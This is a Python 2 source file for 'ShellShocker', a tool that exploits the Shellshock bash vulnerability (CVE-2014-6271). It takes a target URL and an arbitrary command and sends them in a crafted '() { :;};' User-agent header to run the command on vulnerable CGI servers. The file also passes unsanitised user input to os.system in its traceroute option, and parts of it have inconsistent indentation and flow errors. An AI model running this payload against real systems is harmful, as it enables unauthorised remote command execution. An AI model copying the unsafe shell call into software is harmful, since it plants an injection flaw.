#! /usr/bin/python2.7
#qpy:console

####################################         /&/
# ShellShocker  ::     ##########            ! &
# Shellshock bug       ###############     #/!!/
# exploit              ########                   # 
#  ...HackYoUrMind...  ############           #/
# CVE-2014-6271 (Main) ########
#################################                  #

# Stefano Belli <stefano9913@gmail.com> ][ Google+ : <http://plus.google.com/+StefanoBelli>
# Last updated: [DD/MM/YYYY] 14/02/2015, [HH/MM] 04:01 AM 
# Status: initial release
# support: posix (Unix) / Windows may require Cygwin[BATCH NOT SUPPORTED] due to unsupported things. Program runs.
# Be free! Open Source <(C)
# Version: 1.3
# Status: Stable

#Modules
import os
import sys
try:
    import urllib2
except ImportError:
    pass # it is not needed for correctly use but if exception happens
         # user will see stack trace
    print("{!!}Urllib2 is not installed")
    print("{+} But you can use Shellshocker")
    raw_input("Press any key to continue...")
# Sys.Argv -- argument parser
len(sys.argv)

#variables!
global currentWorkDirectory
currentWorkDirectory = os.getcwd()
_licence_ = '''
\033[33mShellShocker <(C) | WARNING
========================================
Be free, but remember that this is a pentest tool
should be used for TEST your systems, i assume no
responsibility ! :D
Exploiting remote machines, WITHOUT administrator/owner
knownledge, is ILLEGAL.
Think before attack your target!

i ADVIDSED you.

:::.::.:::.::.:..::.::::.....:::..:::.
========================================\033[0m
'''
version = "1.3"
status = "Stable"

__main__ = '''
ShellShocker <(C) | Exploit (Shell)

\033[31m #####                               #####                              
#     # #    # ###### #      #      #     # #    #  ####   ####  #    # (er)
#       #    # #      #      #      #       #    # #    # #    # #   #  
 #####  ###### #####  #      #       #####  ###### #    # #      ####   
      # #    # #      #      #            # #    # #    # #      #  #   
#     # #    # #      #      #      #     # #    # #    # #    # #   #  
 #####  #    # ###### ###### #####term#  #####  #    #  ####   ####  #    # \033[0m
                                            Shell-Shock(er)                          

      /* Bash Shocked */
      Vulnerability: \033[32mCVE-2014-6271\033[0m
      Warning: \033[31m10/10 [!!]\033[0m
      Exploit type: \033[31mArbitrary code execution\033[0m
      Vulnerable: \033[33mCGI-BIN is vulnerable ( if bash shell handles request), DHCP Server and more.\033[0m
      Fixed: \033[32mYes\033[0m

      \033[32mPython 2.7
      =>Requires
        -mechanize
        -os
        -sys\033[0m

      \033[34mDeveloper: Stefano Belli (--developer for more info(s) )
      Script version: %s
      GitHub: <http://github.com/StefanoBelli/shellshocker-python>Term
      Last updated: 21/02/2015 [DD/MM/YYYY] @  12:42 PM\033[0m

Usage: shellshocker.py \033[33m<option>

options: --warn
         --developer
         --trace\033[0m
      

''' %version



_developer_ = '''
\033[34mShellShocker <(C) | Developer
=========================================
Stefano Belli,
EMail: <stefano9913@gmail.com>
Google+: <plus.google.com/+StefanoBelli>
Twitter: <@S73FYH4CK>
GitHub: <http://github.com/StefanoBelli>
++++++++++++++++++++++++++++++++++++++++++\033[0m
'''

exitValue = 0
currentDir = os.getcwd()
__welcome__ = '''
ShellShocker <(C) | Restart
<=======================>
Welcome to ShellShocker
restart by: %s
<=======================>'''%currentDir

_retry_ = '''
========================
'''



#Argument 
for arg in sys.argv:
    if arg == "--warn":
        os.system("clear")
        print ("")
        print(_licence_)
        print ("")
        exit(0)
    elif arg == "--developer":
        os.system("clear")
        print ("")
        print(_developer_)
        print ("")
        exit(0)
    elif arg == "--trace": 
        os.system("clear")
        print ("")
        print ("ShellShocker <(C) | TraceTarget ")
        typeTarget = raw_input("{>} Target URL/IP: ")
        os.system("ping %s -t 5 "%typeTarget+"&& traceroute %s"%typeTarget+" || echo 'Not reachable. Aborting traceroute'")
        exit(0)
################################ GO!
try:
    #Check if mechanize is installed, if not let the user choose if he/she(dreams :D ) wants to get it
    import mechanize
except ImportError:
    os.system("clear")
    print("\033[33m{!} Import error: mechanize libs are not installed!")
    #Package manager chooser, install mechanize automatically if not availible (ImportError Exception)
    outOrGet = raw_input("{?} Do you want to exit or get mechanize[e/M]: ")
    if outOrGet == 'e':
        exit(1)
        exitValue = 1
	
    elif outOrGet == 'm':
        packageManager = raw_input("{?} What package manager are you using?[apt/yum/pacman]: ")
        if packageManager == 'apt':
            try:
                os.system("apt-get install python-mechanize")
                os.system("clear")
                print(__welcome__)
                exit(0)
            except KeyboardInterrupt:
                os.system("clear")
                print("\n{!} Quitted by Keyboard Shortcut\n\n")
                exit(0)
            
        elif packageManager == 'yum':
            try:
                os.system("yum install python-mechanize")
                os.system("clear")
                print(__welcome__)
                exit(0) 
            except KeyboardInterrupt:
                os.system("clear")
                print("\n{!} Quitted by Keyboard Shortcut\n\n")
                exit(0)
        elif packageManager == 'pacman':
        	try:
        		os.system("pacman -S python2-mechanize")
        		os.system("clear")
        		print(__welcome__)
        		exit(0)
        	except KeyboardInterrupt:
        		os.system("clear")
        		print("\n{!} Quitted by Keyboard Shortcut\n\n")
        		exit(0)
        else:
            print("\033[31m{!} Other package managers are not supported! (Wait until support comes...) \033[0m")
            exitValue = 1
            exit(1)

    #Check for Android 
    try:
        import androidhelper
    except ImportError:
        print("[!} Supporting Android by QPython ~ TextualShell\n")
        pass 
#Exploit Main menu 
def mainChooser():
    global getTarget
    global getCommand
    try:
        os.system("clear")
        print(__main__)
        getTarget = raw_input("\033[33m{?/!}sskr:type-Target# \033[0m")
        print("\033[32m{!!} Target: %s\033[0m"%getTarget)
        print("")
        getCommand = raw_input("\033[33m{?/!!}sskr:type-Command# \033[0m")
        print("\033[32m{!!} Command: %s\033[0m"%getCommand)
	 
    except KeyboardInterrupt:
        print("\n\033[33m{!} User quitted (while get data) \033[0m")
        exit(0)
    except SyntaxError:
        print("\033[31m{!} Dev error! submit this error: mainChooser() SyntaxError [[ See my email address for more info (call --developer by command line)\033[0m")
        exit(0)
        

#Attack
def attacker():
    try:
        print ("")
        print("\033[31m{!!} All data acquired... Calling %s\033[0m"%getTarget)
        br.open(getTarget)
        response = br.response()
        if response:
            print("\033[32m{+} Command: %s"%getCommand+" executed. %s"%getTarget+" was reachable\033[0m")
            exit(0)
        else:
            print("\033[31m{!} Error(s) happened, but maybe command was executed by bash shell\033[0m")
            print("\033[31mI cannot reach ERROR/EXCEPTION.\033[0m")
            exit(0)
    except NameError:
        print("\033[31m{!!}Mechanize module not found! You need to install it. Run this script can help you, current working directory: %s"%currentWorkDirectory)
        exit(0)
    except KeyboardInterrupt:
        print("\033[33m{!} User quitted [function: attacker() ]")
        exit(0)
    except mechanize._mechanize.BrowserStateError: #now working
        print("")
        print("{!!} Check syntax! ")
        print("{!} Correct syntax should be: [ protocol://name.domain/dir/dir/ ]etc...")
        print("{!} Remember that you must know if Bash shell handles request and variables")
        retryOrNot = raw_input("{?>} What you want to do [r]etry/[e]xit? ")
        if retryOrNot == 'r':
            print("")
            main()
        else:
            print("")
            print("{!}Bye")
            exit(0)
    except urllib2.URLError:
        print("")
        print("{!!} Network is not reachable or target server is busy/not exists ")
	print"{!} Or, robots.txt disallows your request.(Valid reason if you waited some seconds before to see this message)"	
	print("{>}Try to open Shellshocker in '--trace' mode to ping and do a traceroute to the target.(Don't write protocol)")
        whatYouWantToDoURLErrorUnReachable = raw_input("{>} What you want to do [r]etry/[e]xit ")
    if whatYouWantToDoURLErrorUnReachable == 'r':
            main()
    elif whatYouWantToDoURLErrorUnReachable == 'e':
            print("{!>}Exit")
            exit(1)
    else:
            print("{!} Non-valid option ")
            exit(1)

       
def main():
	#MainChooser function
	mainChooser()
	#Mechanize Browser 
	global br
	try:
   		br = mechanize.Browser()
	except NameError:
   		print("\033[33m{!!} Mechanize was not installed. Run this script by: %s"%currentWorkDirectory)
   		exit(1)
	br.addheaders = [('User-agent', '() { :;}; %s'%getCommand)] #fixed  
	br.set_handle_robots("false") #not handling robots
	#attacker function
	attacker()


#Main
main()
